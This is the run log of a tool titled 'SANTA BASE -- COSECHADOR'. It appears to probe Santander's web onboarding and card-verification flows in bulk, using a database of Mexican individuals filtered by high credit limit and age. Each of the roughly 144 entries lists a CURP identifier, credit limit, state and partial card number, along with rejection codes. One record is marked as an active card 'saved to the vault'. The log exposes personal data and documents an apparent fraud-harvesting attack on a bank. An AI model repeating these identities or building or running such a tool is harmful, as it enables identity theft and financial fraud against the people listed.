======================================================================
[*] SANTA BASE -- COSECHADOR DESACOPLADO CON PRE-POOL
======================================================================
BD: C:\Users\rober\Dropbox\TESTING DEV\data\santander.db
Estados: NACIONAL (TODOS LOS ESTADOS)
Filtro de Crédito: Límite >= $50,000 (Prioridad: Límite Más Alto)
Filtro de Edad: Nacidos de 1969 en adelante (<= 57 años)
Concurrencia Onboarding: 2 workers (Meta: 10-20 reg/min)
Bóveda Pool Cap: Pausa en 15 hits ACTIVE, Reanuda en 10
----------------------------------------------------------------------

[+] Lote de 500 candidatos precargados con límite >= $50,000 (1969+)
[*] Consumidor de Verificación de Tarjeta (Santander Web Directo) iniciado.
[1] ID:527039 | NASM790215MMNJLY08 | $200,000 | MICHOACAN | T:3436... [2] ID:528218 | AIOP710629MDFRBL02 | $200,000 | CIUDAD DE ME | T:0735... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.3s)
[3] ID:529141 | MOBF690102MMNJRN04 | $200,000 | MICHOACAN | T:2804... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.7s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3436 para ID:527039 ($200,000)... [4] ID:538686 | FOOA710121HSPLRN03 | $200,000 | SAN LUIS POT | T:7474... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.4s)
[5] ID:541308 | MORJ690103HPLRDM05 | $200,000 | PUEBLA | T:6595... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (12.8s)
[6] ID:544852 | GADL760420MCHRRR01 | $200,000 | CHIHUAHUA | T:9962... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (20.4s)
[7] ID:545387 | MARA701029HMCRZL06 | $200,000 | ESTADO DE ME | T:6208... [⚠️ RETRY] Timeout global de verificación (22s) (22.0s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9962 para ID:544852 ($200,000)... [8] ID:545946 | SACC741222HGTNSR01 | $200,000 | GUANAJUATO | T:2195... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[9] ID:552923 | PEBM750422MTCRTR01 | $200,000 | TABASCO | T:3213... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (8.2s)
[10] ID:556739 | RARL730212MDFMDR03 | $200,000 | CIUDAD DE ME | T:5999... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.0s)
[11] ID:557000 | RIMI720104MASNRS03 | $200,000 | AGUASCALIENT | T:6553... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3213 para ID:552923 ($200,000)... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.0s)
[12] ID:563988 | CAOD710828HMNLRT03 | $200,000 | MICHOACAN | T:8778... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.0s)
[13] ID:569061 | CEUK700927MMCLGR05 | $200,000 | ESTADO DE ME | T:1977... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (14.0s)
[14] ID:572921 | LAOM701005MTSSSR02 | $200,000 | TAMAULIPAS | T:8966... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6553 para ID:557000 ($200,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.1s)
[15] ID:576681 | VARO690529HMCLMS02 | $200,000 | ESTADO DE ME | T:6669... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.8s)
[16] ID:576686 | BADJ700213HCSLZR05 | $200,000 | CHIAPAS | T:7519... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo bancario (PE1002) (15.1s)
[17] ID:581974 | CAMG760604MCGMGL01 | $200,000 | COAHUILA | T:7367... [⚠️ RETRY] Timeout global de verificación (22s) (22.0s)
[18] ID:583689 | AESA720830HSORNN06 | $200,000 | SINALOA | T:2842... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.7s)
[19] ID:589954 | LUCF700305HDFNRS01 | $200,000 | CIUDAD DE ME | T:5154... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.7s)
[20] ID:596812 | COCR730702HCMNSB09 | $200,000 | COLIMA | T:4820... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (14.0s)
[21] ID:603636 | OIPR710401HSPLXD09 | $200,000 | SAN LUIS POT | T:2659... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.6s)
[22] ID:611740 | DIMF710510HMNZRR03 | $200,000 | MICHOACAN | T:3298... [⚠️ RETRY] Timeout global de verificación (22s) (22.0s)
[23] ID:617882 | VICR731213HMCLRB06 | $200,000 | ESTADO DE ME | T:4536... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.2s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3298 para ID:611740 ($200,000)... [24] ID:618932 | OICE810214HGTRHD04 | $200,000 | GUANAJUATO | T:1327... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (15.4s)
[25] ID:622286 | VIAE780729MMNLRR09 | $200,000 | MICHOACAN | T:2720... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (16.7s)
[26] ID:622635 | AACE720624MVRMRL09 | $200,000 | VERACRUZ | T:7844... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1327 para ID:618932 ($200,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[27] ID:630054 | LOGC721105HDFRRR06 | $200,000 | CIUDAD DE ME | T:2444... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.7s)
[28] ID:630628 | MEMF740708MTSLNL00 | $200,000 | TAMAULIPAS | T:6450... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2720 para ID:622286 ($200,000)... [🔴 OFF] Rechazo bancario (PE020) (10.9s)
[29] ID:630718 | MOCL730326HQRRRB00 | $200,000 | QUINTANA ROO | T:0917... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[30] ID:648346 | AIBH701113HCGVLC09 | $200,000 | COAHUILA | T:4408... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.4s)
[31] ID:681237 | TAGO701017HYCMMS08 | $200,000 | YUCATAN | T:4890... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6450 para ID:630628 ($200,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.2s)
[32] ID:688095 | BARA730627HTSLSR03 | $200,000 | TAMAULIPAS | T:1044... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.1s)
[33] ID:688597 | NASM790215MMNJLY08 | $200,000 | MICHOACAN | T:5441... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.2s)
[34] ID:688870 | PERJ790809HMCRZN02 | $200,000 | ESTADO DE ME | T:0100... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5441 para ID:688597 ($200,000)... [🔴 OFF] Rechazo bancario (PE170) (17.1s)
[35] ID:704128 | FILG691030HCHRZR05 | $200,000 | CHIHUAHUA | T:9440... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (13.6s)
[36] ID:711385 | AUGG771016MHGGRD00 | $200,000 | HIDALGO | T:2631... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (15.3s)
[37] ID:714273 | EIAM700817HNLLRR09 | $200,000 | NUEVO LEON | T:4712... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.5s)
[38] ID:717201 | VIVM700718MCGRLR05 | $200,000 | COAHUILA | T:5741... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[39] ID:719104 | SARC700819HDFNSR01 | $200,000 | CIUDAD DE ME | T:8946... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.5s)
[40] ID:719868 | AOTE760402HMCCNL00 | $200,000 | ESTADO DE ME | T:0428... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:4712 para ID:714273 ($200,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (14.4s)
[41] ID:743460 | RIGJ000101HMCVTVA1 | $200,000 | ESTADO DE ME | T:4938... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.4s)
[42] ID:746447 | NUVM701230HDFNLN00 | $200,000 | CIUDAD DE ME | T:0436... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8946 para ID:719104 ($200,000)... [43] ID:758327 | AAAC691122MVRLVC01 | $200,000 | VERACRUZ | T:5917... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.1s)
[44] ID:764781 | AACD710522HDFLRV09 | $200,000 | CIUDAD DE ME | T:0933... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[45] ID:791590 | AARE010101MDFLZBA0 | $200,000 | CIUDAD DE ME | T:2309... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[46] ID:793988 | BALJ790509HPLZPV06 | $200,000 | PUEBLA | T:2972... [⚠️ RETRY] Timeout global de verificación (22s) (22.0s)
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (16.9s)
[47] ID:796022 | TEFL780513HMCRRS02 | $200,000 | ESTADO DE ME | T:3838... [48] ID:796462 | QURF700928MCHZMB02 | $200,000 | CHIHUAHUA | T:3960... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.0s)
[49] ID:799596 | GUCJ750711HNTRRL07 | $200,000 | NAYARIT | T:1319... [🔴 OFF] Rechazo bancario (PE1002) (12.8s)
[50] ID:803248 | SOSG701214MCHLLD01 | $200,000 | CHIHUAHUA | T:6414... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.0s)
[51] ID:824563 | TOCM691025HDFRSR08 | $200,000 | CIUDAD DE ME | T:3770... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1319 para ID:799596 ($200,000)... [🔴 OFF] Rechazo bancario (PE1002) (14.5s)
[52] ID:849629 | RAME750207HDFMRR03 | $200,000 | CIUDAD DE ME | T:4318... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (18.7s)
[53] ID:869317 | SASC710905HBCMLS03 | $200,000 | BAJA CALIFOR | T:2593... [🔴 OFF] Rechazo bancario (PE170) (16.6s)
[54] ID:870308 | CUGL730925HMCVRS04 | $200,000 | ESTADO DE ME | T:3997... [🔴 OFF] Rechazo bancario (PE170) (13.9s)
[55] ID:879332 | JICL721102HTSMRS01 | $200,000 | TAMAULIPAS | T:0343... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[56] ID:879333 | DELJ741113HSOLPS02 | $200,000 | SONORA | T:0442... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.1s)
[57] ID:900204 | MOGE691101HNLRRD06 | $200,000 | NUEVO LEON | T:9151... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[58] ID:901671 | EUNE691021HMCSVD07 | $200,000 | ESTADO DE ME | T:8928... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (9.5s)
[59] ID:903691 | HERL760131MTCRMT01 | $200,000 | TABASCO | T:7890... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (8.1s)
[60] ID:912806 | DIMM780421HGTZNR09 | $200,000 | GUANAJUATO | T:9616... [🔴 OFF] Rechazo bancario (PE170) (16.0s)
[61] ID:916438 | AAMO700221HDFLCS07 | $200,000 | CIUDAD DE ME | T:6080... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.0s)
[62] ID:921540 | CASJ710704HDFLRS00 | $200,000 | CIUDAD DE ME | T:7031... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.4s)
[63] ID:942317 | GOCF711113HPLNHR08 | $200,000 | PUEBLA | T:2759... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.8s)
[64] ID:944509 | CEEJ750214HDFHNC06 | $200,000 | CIUDAD DE ME | T:0881... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6080 para ID:916438 ($200,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.5s)
[65] ID:949537 | SAAM700929HVRLLG05 | $200,000 | VERACRUZ | T:2179... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (9.2s)
[66] ID:951435 | FIMN700209MMSGRM04 | $200,000 | MORELOS | T:0615... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.6s)
[67] ID:989104 | SAGA781001HMCNRN01 | $200,000 | ESTADO DE ME | T:5983... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[68] ID:1024549 | AUCR770225HYNGNM08 | $200,000 | YUCATAN | T:6240... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2759 para ID:942317 ($200,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.3s)
[69] ID:1043979 | MAAN690407HDFRCN07 | $200,000 | CIUDAD DE ME | T:1530... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (14.3s)
[70] ID:1056401 | DIAB721202MDFZLB05 | $200,000 | CIUDAD DE ME | T:8073... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5983 para ID:989104 ($200,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[71] ID:1066967 | EASA740821HQTSTL04 | $200,000 | QUERETARO | T:9212... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[72] ID:1070628 | LEHJ690418HDFVMC09 | $200,000 | CIUDAD DE ME | T:4593... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.7s)
[73] ID:1098105 | TOLA840310MSPRRD06 | $200,000 | SAN LUIS POT | T:7943... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (16.2s)
[74] ID:1103443 | CACF740401HMSLNR09 | $200,000 | MORELOS | T:6846... [🔴 OFF] Rechazo bancario (PE170) (12.5s)
[75] ID:1130099 | ROMP690810HQRMDB02 | $200,000 | QUINTANA ROO | T:9287... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.8s)
[76] ID:1134751 | FOCJ721220HPLLRL06 | $200,000 | PUEBLA | T:6936... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.2s)
[77] ID:1136344 | CUVC710309MPLRLL09 | $200,000 | PUEBLA | T:6583... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.3s)
[78] ID:1148821 | MAGR000101HMCRMYA3 | $200,000 | ESTADO DE ME | T:5172... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6936 para ID:1134751 ($200,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.3s)
[79] ID:1153638 | CAPM750820MMNHRN03 | $200,000 | MICHOACAN | T:0816... [🔴 OFF] Contacto preexistente (/confirm-contact) (17.6s)
[80] ID:1159646 | MOVJ710409MBSNRS05 | $200,000 | BAJA CALIFOR | T:1023... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (9.8s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0816 para ID:1153638 ($200,000)... [81] ID:1168962 | QUIP740202HMSVNB00 | $200,000 | MORELOS | T:6229... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.1s)
[82] ID:1180100 | PEGM750517HNLRJG00 | $200,000 | NUEVO LEON | T:6232... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.7s)
[83] ID:1184193 | AARF731202HASNYL00 | $200,000 | AGUASCALIENT | T:4213... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[84] ID:1184280 | AULJ791124HMCQPN08 | $200,000 | ESTADO DE ME | T:5079... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.8s)
[85] ID:1202068 | GOHF710428HNTNRR05 | $200,000 | NAYARIT | T:3077... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.0s)
[86] ID:1208351 | AUGG710520HMSGML06 | $200,000 | MORELOS | T:8985... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[87] ID:1216805 | FEBE690926HZSLRN04 | $200,000 | ZACATECAS | T:8199... [🔴 OFF] Contacto preexistente (/confirm-contact) (18.6s)
[88] ID:1220024 | CACX700510HDFSSN02 | $200,000 | CIUDAD DE ME | T:0849... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.2s)
[89] ID:1222777 | DUPE700329HQRZTS01 | $200,000 | QUINTANA ROO | T:7436... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8199 para ID:1216805 ($200,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[90] ID:1275017 | LUHA700521HMSLRN01 | $200,000 | MORELOS | T:4662... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.2s)
[91] ID:1289688 | BAVM751008HBSRLN03 | $200,000 | BAJA CALIFOR | T:3667... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (15.0s)
[92] ID:1291475 | MAFA701011MMNRRX03 | $200,000 | MICHOACAN | T:9910... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[93] ID:1294987 | BESJ810717HMSRRR00 | $200,000 | MORELOS | T:0211... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7436 para ID:1222777 ($200,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.7s)
[94] ID:1330482 | VEVS781013MDFRGF02 | $200,000 | CIUDAD DE ME | T:0104... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.7s)
[95] ID:1333785 | PERJ710110MVRRNS02 | $200,000 | VERACRUZ | T:5125... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.6s)
[96] ID:1334676 | GAAM730207HTCRBR04 | $200,000 | TABASCO | T:0419... [🔴 OFF] Contacto preexistente (/confirm-contact) (16.2s)
[97] ID:1349121 | BAMJ700108HQTRRM01 | $200,000 | QUERETARO | T:9631... [🔴 OFF] Rechazo bancario (PE170) (18.3s)
[98] ID:1371064 | CUCU770912HDFRRL02 | $200,000 | CIUDAD DE ME | T:0202... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.3s)
[99] ID:1372211 | TOMF720329HDFRNL08 | $200,000 | CIUDAD DE ME | T:0934... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.8s)
[100] ID:1407062 | NUVM820116HMCNLR09 | $200,000 | ESTADO DE ME | T:4497... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (15.3s)
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.1s)
[101] ID:1408076 | LOMA720821MMCPRN01 | $200,000 | ESTADO DE ME | T:5750... [102] ID:1411540 | LOPB760705MMCPRR00 | $200,000 | ESTADO DE ME | T:4446... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0934 para ID:1372211 ($200,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[103] ID:1414702 | LEON690516HHGYSX05 | $200,000 | HIDALGO | T:7699... [104] ID:1437266 | SAFF710730HDFNRD02 | $200,000 | CIUDAD DE ME | T:4892... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.4s)
[105] ID:1440819 | CACM741227HASDRN09 | $200,000 | AGUASCALIENT | T:4267... [🔴 OFF] Rechazo bancario (PE170) (15.5s)
[106] ID:1449279 | LOAI710212HMNPNG08 | $200,000 | MICHOACAN | T:3627... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[107] ID:1479655 | DESY010101MMSCRYA5 | $200,000 | MORELOS | T:3840... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.4s)
[108] ID:1484242 | LEEI730111HTSNSS05 | $200,000 | TAMAULIPAS | T:8870... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.9s)
[109] ID:1490264 | ZAGM720526HSPMNS09 | $200,000 | SAN LUIS POT | T:2391... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3627 para ID:1449279 ($200,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.4s)
[110] ID:1517962 | BAFR730913HSPLLC09 | $200,000 | SAN LUIS POT | T:9689... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.5s)
[🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[111] ID:1526549 | ZERA700917MCSPVD05 | $200,000 | CHIAPAS | T:2380... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.4s)
[112] ID:1527723 | SEGM760407HDFSRS00 | $200,000 | CIUDAD DE ME | T:8843... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8870 para ID:1484242 ($200,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.9s)
[🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[113] ID:1550473 | SIGL700826HCHLTS07 | $200,000 | CHIHUAHUA | T:7467... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.8s)
[114] ID:1559778 | POCM850209MVRRRN06 | $200,000 | VERACRUZ | T:6826... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2380 para ID:1526549 ($200,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[115] ID:1563087 | AUDJ711216HGTNCS03 | $200,000 | LEON DE LOS  | T:1352... [🔴 OFF] Rechazo bancario (PE170) (14.2s)
[116] ID:1563223 | CIVR700422MDFSLC04 | $200,000 | CIUDAD DE ME | T:7501... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.5s)
[117] ID:1564444 | MOMJ741011HGTNQR06 | $200,000 | GUANAJUATO | T:2143... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1352 para ID:1563087 ($200,000)... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.4s)
[118] ID:1582166 | PAFJ731017HMCLLS07 | $200,000 | ESTADO DE ME | T:3340... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[119] ID:1588171 | TEUG710716HMCJRR01 | $200,000 | ESTADO DE ME | T:2832... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.7s)
[120] ID:1591772 | AAHC790624HHGLRS06 | $200,000 | HIDALGO | T:0972... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.1s)
[121] ID:1594530 | ZAGC801008HMCRDR02 | $200,000 | ESTADO DE ME | T:5944... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.7s)
[122] ID:1603084 | MAEM690906MSONSR02 | $200,000 | SINALOA | T:7227... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0972 para ID:1591772 ($200,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.5s)
[123] ID:1607032 | VAGR730614HSOLXM03 | $200,000 | SINALOA | T:9145... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[124] ID:1631340 | GUHM710430HMNZRR04 | $200,000 | MICHOACAN | T:2249... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.8s)
[125] ID:1639119 | FOFJ690622HDFLRQ00 | $200,000 | CIUDAD DE ME | T:5317... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5944 para ID:1594530 ($200,000)... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.0s)
[126] ID:1672157 | RONA760414HMNMNL04 | $200,000 | MICHOACAN | T:5540... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (15.0s)
[🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[127] ID:1673580 | BEAA771021HPLNRL00 | $200,000 | PUEBLA | T:7736... [🔴 OFF] Rechazo bancario (PE170) (20.7s)
[128] ID:1675758 | VIRI760403HVRVMS00 | $200,000 | VERACRUZ | T:9552... [🔴 OFF] Rechazo bancario (PE020) (13.7s)
[129] ID:1682471 | SASD730212MCHLTR01 | $200,000 | CHIHUAHUA | T:6407... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[130] ID:1714482 | PAAJ730714HMCCQV01 | $200,000 | ESTADO DE ME | T:9464... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (15.0s)
[131] ID:1726070 | PELG730221MPLRPB09 | $200,000 | PUEBLA | T:6539... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (16.7s)
[132] ID:1738275 | SABA710726MNLNRN01 | $200,000 | NUEVO LEON | T:9308... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (16.4s)
[133] ID:1763977 | EIEA690902HDFSSN03 | $200,000 | CIUDAD DE ME | T:0117... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.5s)
[134] ID:1780295 | NACJ750915HPLNHS08 | $200,000 | PUEBLA | T:1128... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[135] ID:1782945 | ROCC691003MDFSRR01 | $200,000 | CIUDAD DE ME | T:0527... [🔴 OFF] Rechazo bancario (PE170) (21.2s)
[136] ID:1786850 | CUHO710810HNLRRS09 | $200,000 | NUEVO LEON | T:4020... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.2s)
[137] ID:1790680 | DIRJ720406HGTZMV03 | $200,000 | GUANAJUATO | T:1406... [⚠️ RETRY] Timeout global de verificación (22s) (22.0s)
[138] ID:1795100 | GAMR700223HTSRNC05 | $200,000 | TAMAULIPAS | T:9965... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.8s)
[139] ID:1795102 | SADJ690415HSONVR09 | $200,000 | SINALOA | T:0547... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.8s)
[140] ID:1796690 | ZAMC700430MMNVDR04 | $200,000 | MICHOACAN | T:1807... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1406 para ID:1790680 ($200,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.2s)
[141] ID:1825291 | GALA711022HDFLGL06 | $200,000 | CIUDAD DE ME | T:9789... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.6s)
[142] ID:1834814 | JUAP740901MASRVL02 | $200,000 | AGUASCALIENT | T:3711... [🟢 HIT #1] Tarjeta ACTIVA Confirmada -> Guardado en bóveda!

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1807 para ID:1796690 ($200,000)... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.4s)
[143] ID:1844743 | MACC710401HQRRNR09 | $200,000 | QUINTANA ROO | T:9512... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.8s)
[144] ID:1861640 | RALG720426MMCMPB09 | $200,000 | ESTADO DE ME | T:7025... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.8s)
